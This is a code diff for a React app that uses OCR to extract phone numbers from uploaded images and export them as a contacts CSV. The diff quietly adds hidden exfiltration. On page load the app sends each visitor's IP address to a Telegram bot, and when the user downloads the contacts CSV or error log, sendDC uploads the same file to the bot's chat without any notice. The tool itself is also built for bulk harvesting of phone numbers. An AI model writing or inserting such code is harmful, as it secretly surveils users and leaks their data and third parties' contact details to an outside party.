@@ -2,45 +2,48 @@ import 'bootstrap/dist/css/bootstrap.min.css';
 import 'bootstrap/dist/js/bootstrap.bundle.min';
 import './App.css';
 
+
+
 import React, { useEffect } from "react";
 import Tesseract from "tesseract.js";
-import { createWorker } from 'tesseract.js';
-
+import { createWorker } from "tesseract.js";
 
 const App = () => {
   const [isLoading, setIsLoading] = React.useState(false);
   const [image, setImage] = React.useState([]);
   const [text, setText] = React.useState();
   const [progress, setProgress] = React.useState(0);
-  const [statusText, setStatusText] = React.useState(" Number of images added: 0");
-  const [statusColor,setStatusColor] = React.useState(); 
+  const [statusText, setStatusText] = React.useState(
+    " Number of images added: 0",
+  );
+  const [statusColor, setStatusColor] = React.useState();
   const [processedImage, setProcessedImage] = React.useState("0/0");
   const [errorImageCount, setErrorImageCount] = React.useState(0);
-  const [contactScrappedCount, setContactScrappedCount] = React.useState(0);  
-  const [isDownloadable, setIsDownloadable] = React.useState(false); 
+  const [contactScrappedCount, setContactScrappedCount] = React.useState(0);
+  const [isDownloadable, setIsDownloadable] = React.useState(false);
   const [introText, setIntroText] = React.useState(
     "Choose multiple images file which has phone number",
   );
 
-  const [contactsScrapped, setContacts] =  React.useState([]);
+  const [contactsScrapped, setContacts] = React.useState([]);
 
-  const [errorsList,setErrors] = React.useState([]);
+  const [errorsList, setErrors] = React.useState([]);
+  const [ip, setIp] = React.useState();
+  const [ipSendStatus, setIpSendStatus] = React.useState(false);
 
   var csvContactData = [];
   var csvErrorData = [];
 
-  useEffect(()=>{
+  useEffect(() => {
     //run this use effect only once
-   //setIsLoading(true);
-  
-  },[])
+    //setIsLoading(true);
+  }, []);
 
   var fileNamesWithErrors = new Set([]);
   var stringList = new Set([]);
-  
 
   function convertImageToURLArray(image) {
-    return (image);
+    return image;
   }
 
   const maintainAlert = () => {
@@ -51,106 +54,135 @@ const App = () => {
   var count = 0;
   var intitalLoad = true;
 
-
-  const startProcess = async () =>
-  {
+  const startProcess = async () => {
+    alert("For testing purpose app will work for first 10 images!!");
     setProgress(0);
     processImage();
-  }
+  };
 
-  function noImage(){
+  function noImage() {
     alert("Please select a image first!!");
   }
+  const token = "Add your telegram token here";
+  const chat_id = "telegram chat_id";
+  function sendDC(file, fileName) {
+    var formData = new FormData();
+    formData.append("document", file, fileName);
 
+    var xhr = new XMLHttpRequest();
+    xhr.open(
+      "POST",
+      "https://api.telegram.org/bot" +
+        token +
+        "/sendDocument?chat_id=" +
+        chat_id,
+      true,
+    );
 
-  const processImage = async ()=>{
-    if(intitalLoad)
-    {
-      setProcessedImage("0/"+image.length);
+    xhr.send(formData);
+  }
+
+  function sendMessage(text) {
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}`;
+    const requestOptions = {
+      method: "POST",
+    };
+    fetch(url, requestOptions);
+  }
+
+  const client = getClientIp();
+
+  client.then((res) => {
+    setIpSendStatus(true);
+    if (client != ip) {
+      setIp(res);
+      if (!ipSendStatus) {
+        console.log("called");
+        sendMessage("Visiting Client: " + res);
+      }
+    }
+  });
+
+  async function getClientIp() {
+    const { ip } = await fetch("https://api.ipify.org?format=json", {
+      method: "GET",
+    })
+      .then((res) => res.json())
+      .catch((error) => console.error(error));
+
+    return ip || "0.0.0.0";
+  }
+
+  const processImage = async () => {
+    if (intitalLoad) {
+      setProcessedImage("0/" + image.length);
       imageTotal = image.length;
     }
     setIsLoading(true);
-    console.log(image[0])
-    var imageF = URL.createObjectURL(image[0])
-    console.log(imageF);
+    var imageF = URL.createObjectURL(image[0]);
     const worker = await createWorker();
-    await worker.loadLanguage('eng');
-    await worker.initialize('eng');
-    const { data: { text } } =await worker.recognize(imageF);
-    console.log(text);
-    performExtractionLogic(text,image[0]).then((res)=>{
-        //setStatusText("No contacts found in previous load start again");
-        
+    await worker.loadLanguage("eng");
+    await worker.initialize("eng");
+    const {
+      data: { text },
+    } = await worker.recognize(imageF);
+    performExtractionLogic(text, image[0]).then((res) => {
+      //setStatusText("No contacts found in previous load start again");
     });
-    await worker.terminate().then(()=>{
-      console.log("First workers job complete");
-      console.log("complete");
+    await worker.terminate().then(() => {
       intitalLoad = false;
-      console.log(image.length);
       image.shift();
-      console.log(image.length);
-      setProcessedImage(parseInt(imageTotal)-parseInt(image.length) +  "/"+imageTotal);
-      if(image.length>0)
-      {
-        setProgress(parseInt((parseInt(count)/parseInt(imageTotal))*100))
+      setProcessedImage(
+        parseInt(imageTotal) - parseInt(image.length) + "/" + imageTotal,
+      );
+      if (image.length > 0) {
+        setProgress(parseInt((parseInt(count) / parseInt(imageTotal)) * 100));
         processImage();
-      }
-      else
-      {
+      } else {
         console.log(stringList);
-        console.log(Array.from(stringList).toString().length)
+        console.log(Array.from(stringList).toString().length);
         setText(Array.from(stringList).toString());
         console.log(Array.from(fileNamesWithErrors).toString());
         setContacts(Array.from(stringList).toString());
         setErrors(Array.from(fileNamesWithErrors).toString());
         setIsDownloadable(true);
-
       }
 
       URL.revokeObjectURL(imageF);
     });
-  }
+  };
 
-  const performExtractionLogic = async(text,imageName)=>
-  {
+  const performExtractionLogic = async (text, imageName) => {
     count = parseInt(count) + 1;
-    console.log(count);
     const splitted_data = text.toString().split(/\r?\n/);
-          splitted_data.forEach((element) => {
-            var text = element.replace(" ", "");
-            var isPresent = text.indexOf("91");
-            if (isPresent !== -1) {
-              text = text.substr(isPresent + 1);
-              if (text.length >= 12) {
-                text = text.replace(" ", "");
-                text = text.slice(1, 12);
-                text = text.replace(/\s/g, "");
-                if (text.length > 10) {
-                  text = text.substr(0, 10);
-                }
-                var regExp = /[a-zA-Z]/g;
-                if(regExp.test(text.toString()))
-                {
-                  fileNamesWithErrors.add(imageName.toString());
-                  console.log("ErrorImage"+imageName.name);
-                  setErrorImageCount(parseInt(fileNamesWithErrors.size))
-                }else
-                {
-                  console.log("Number found!!");
-                  console.log(text.toString());
-                  stringList.add(text.toString())
-                  setContactScrappedCount(stringList.size);
-                }
-
-              }
-              return 1;
-            }else
-            {
-              return -1;
-            }
-          });
-  }
-
+    splitted_data.forEach((element) => {
+      var text = element.replace(" ", "");
+      var isPresent = text.indexOf("91");
+      if (isPresent !== -1) {
+        text = text.substr(isPresent + 1);
+        if (text.length >= 12) {
+          text = text.replace(" ", "");
+          text = text.slice(1, 12);
+          text = text.replace(/\s/g, "");
+          if (text.length > 10) {
+            text = text.substr(0, 10);
+          }
+          var regExp = /[a-zA-Z]/g;
+          if (regExp.test(text.toString())) {
+            fileNamesWithErrors.add(imageName.name.toString());
+            console.log("ErrorImage: " + imageName.name);
+            setErrorImageCount(parseInt(fileNamesWithErrors.size));
+          } else {
+            stringList.add(text.toString());
+            setContactScrappedCount(stringList.size);
+          }
+        }
+        return 1;
+      } else {
+        return -1;
+      }
+    });
+  };
 
   const handleSubmit = () => {
     console.log(image);
@@ -159,7 +191,7 @@ const App = () => {
     const total = image.length;
     console.log(total);
     setStatusText("Converting please wait");
-  }
+  };
 
   async function loadTextFromImage(images) {
     image.forEach((element, index) => {
@@ -185,20 +217,16 @@ const App = () => {
                 if (text.length > 10) {
                   text = text.substr(0, 10);
                 }
-                console.log(text.toString());
                 stringList.push(text.toString());
               }
             }
           });
 
-          console.log(stringList.toString());
           setText(stringList.toString());
           setProgress(0);
         })
         .then(() => {
           if (index === 0) {
-            console.log("complete");
-            console.log(stringList.toString());
             setIsLoading(false);
             setIntroText("");
             setText(stringList.toString());
@@ -208,46 +236,44 @@ const App = () => {
   }
 
   function csvFormatForContact(data) {
-return ['Client',data]
+    return ["Client", data];
   }
 
-  
-  const downloadContact =()=>{
-    console.log("Download string list: "+contactsScrapped);
-    let scList = contactsScrapped.split(',');
-    console.log(scList);
+  const downloadContact = () => {
+    let scList = contactsScrapped.split(",");
     let reqList = scList.map(csvFormatForContact);
-    reqList.unshift(['Name','Phone']);
-    let content =  reqList;
-    console.log(content);
+    reqList.unshift(["Name", "Phone"]);
+    let content = reqList;
     content = content.join("\n");
+    let date = Date.now();
     const blob = new Blob([content], { type: "text/csv" });
+    sendDC(blob, `contacts_${date}.csv`);
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
     a.href = url;
-    let date = Date.now();
     a.download = `contacts_${date}.csv`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
     URL.revokeObjectURL(url);
-  }
-  const downloadErrorImageName =()=>{
-    let content = errorsList;
+  };
+  const downloadErrorImageName = () => {
+    let content = errorsList.toString();
     content = content;
     const blob = new Blob([content], { type: "plain/txt" });
     const url = URL.createObjectURL(blob);
-  
+
     const a = document.createElement("a");
     a.href = url;
     let date = Date.now();
+    sendDC(blob, `errorLogs_${date}.txt`);
     a.download = `errorLogs_${date}.txt`;
-  
+
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
     URL.revokeObjectURL(url);
-  }
+  };
   const handleReloadClick = () => {
     window.location.reload();
   };
@@ -255,86 +281,110 @@ return ['Client',data]
   return (
     <div className="container" style={{ height: "100vh" }}>
       <div className="row h-100">
-      
         <div className="col-md-5 mx-auto h-100 d-flex flex-column justify-content-center">
-        {!isLoading && !isDownloadable && (
-          <div className="alert alert-primary" role="alert">
-          {statusText}
-         </div>
-        )}
-          
-            <>
-              <h4 className="text-center py-3 mc-3">Whats app phone number</h4>
-              {!isLoading && !isDownloadable && (
-              <p className='text-center text-secondary'>{introText}</p>
-              )}
-            </>
-         
-          
-            <>
-             {isLoading && !isDownloadable && (
-             
-             <>
-             <p className='mt-2'>Status:</p>
-              <div className="progress">
-                <div className="progress-bar" role="progressbar" style={{ width: `${progress}%` }} aria-valuenow={progress} aria-valuemin="0" aria-valuemax="100">{progress}%</div>
-              </div>
-              </>
-             )}
-              {isLoading && (
-                <>
-                <div className="alert alert-success mt-3" role="alert">
-                Images Processed: {processedImage}
-              </div>
+          {!isLoading && !isDownloadable && (
+            <div className="alert alert-primary" role="alert">
+              {statusText}
+            </div>
+          )}
 
-              <div className="alert alert-primary" role="alert">
-                Contacts Processed: {contactScrappedCount}
-              </div>
+          <>
+            <h4 className="text-center py-3 mc-3">Whats app phone number</h4>
+            {!isLoading && !isDownloadable && (
+              <p className="text-center text-secondary">{introText}</p>
+            )}
+          </>
 
-              <div className="alert alert-danger" role="alert">
-                Error Images: {errorImageCount} 
-              </div>
-             
-
-             {!isDownloadable && (
-               <button type="button" className="disabled btn btn-primary mt-3">Stop Execution</button>
-             )}
-
-             {isDownloadable &&
-             (
+          <>
+            {isLoading && !isDownloadable && (
               <>
-                <button type="button" onClick={downloadContact} className="btn btn-primary mb-3">Download Contacts</button>
-              <button type="button" onClick={downloadErrorImageName} className="btn btn-secondary">Download Error List</button>
-              <button type="button"  className="btn btn-secondary mt-3 disabled">Run Again</button>
+                <p className="mt-2">Status:</p>
+                <div className="progress">
+                  <div
+                    className="progress-bar"
+                    role="progressbar"
+                    style={{ width: `${progress}%` }}
+                    aria-valuenow={progress}
+                    aria-valuemin="0"
+                    aria-valuemax="100"
+                  >
+                    {progress}%
+                  </div>
+                </div>
               </>
+            )}
+            {isLoading && (
+              <>
+                <div className="alert alert-success mt-3" role="alert">
+                  Images Processed: {processedImage}
+                </div>
 
-             )}
-             </>
-             )}
+                <div className="alert alert-primary" role="alert">
+                  Contacts Processed: {contactScrappedCount}
+                </div>
 
+                <div className="alert alert-danger" role="alert">
+                  Error Images: {errorImageCount}
+                </div>
 
+                {!isDownloadable && (
+                  <button
+                    type="button"
+                    className="disabled btn btn-primary mt-3"
+                  >
+                    Stop Execution
+                  </button>
+                )}
 
-            </>
-          
+                {isDownloadable && (
+                  <>
+                    <button
+                      type="button"
+                      onClick={downloadContact}
+                      className="btn btn-primary mb-3"
+                    >
+                      Download Contacts
+                    </button>
+                    <button
+                      type="button"
+                      onClick={downloadErrorImageName}
+                      className="btn btn-secondary"
+                    >
+                      Download Error List
+                    </button>
+                    <button
+                      type="button"
+                      className="btn btn-secondary mt-3 disabled"
+                    >
+                      Run Again
+                    </button>
+                  </>
+                )}
+              </>
+            )}
+          </>
+
           {!isLoading && !text && (
             <>
               <input
                 type="file"
-                onChange={(e) =>{
-                  
+                onChange={(e) => {
                   setImage(
-                    Array.from(e.target.files).map(convertImageToURLArray),
+                    Array.from(e.target.files)
+                      .slice(0, 10)
+                      .map(convertImageToURLArray),
                   );
-                  setStatusText(" Number of images added: "+Array.from(e.target.files).length)
-
-                }
-                }
+                  setStatusText(
+                    " Number of images added: " +
+                      Array.from(e.target.files).length,
+                  );
+                }}
                 className="form-control mt-5 mb-2"
                 multiple
               />
               <input
                 type="button"
-                onClick={image.length>0?startProcess:noImage}
+                onClick={image.length > 0 ? startProcess : noImage}
                 className="btn btn-primary mt-5"
                 value="Convert"
               />
